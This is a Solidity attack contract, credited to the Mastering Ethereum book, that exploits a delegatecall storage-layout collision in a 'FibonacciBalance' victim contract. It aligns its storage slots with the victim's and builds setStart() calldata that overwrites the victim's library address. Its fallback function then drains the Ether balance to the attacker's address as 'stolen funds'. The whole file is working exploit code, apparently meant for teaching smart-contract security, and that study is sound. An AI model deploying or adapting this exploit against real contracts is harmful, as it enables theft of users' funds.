pragma solidity ^0.6.4;

//Example from the Mastering Ethereum book
// Version of Solidity compiler this program was written for
contract AttackF {
    // Storage slots must align with the victim contract
    address public fibonacciLibrary;       // corresponds to storage slot 0 in FibonacciBalance
    uint public calculatedFibNumber;       // corresponds to storage slot 1 in FibonacciBalance
    uint public start;                     // corresponds to storage slot 2 in FibonacciBalance
    uint public withdrawalCounter;         // corresponds to storage slot 3 in FibonacciBalance

    // Address where stolen funds will be sent
    address payable public attackerAddress;

    constructor() public {
        attackerAddress = msg.sender; // Set the attacker's address
    }

    /// Get the calldata here (easier)
    function getPayload(address attackAddress) public pure returns (bytes memory) {
        return abi.encodeWithSelector(
            bytes4(keccak256("setStart(uint256)")),
            uint256(uint160(attackAddress))
        );
    }

    // Fallback function to exploit the victim
    fallback() external payable {
        // Overwrite the calculatedFibNumber in the victim contract
        calculatedFibNumber = 0;

        // Send all Ether from the victim to the attacker
        attackerAddress.transfer((address(this).balance)-1 ether);
    }
    
}
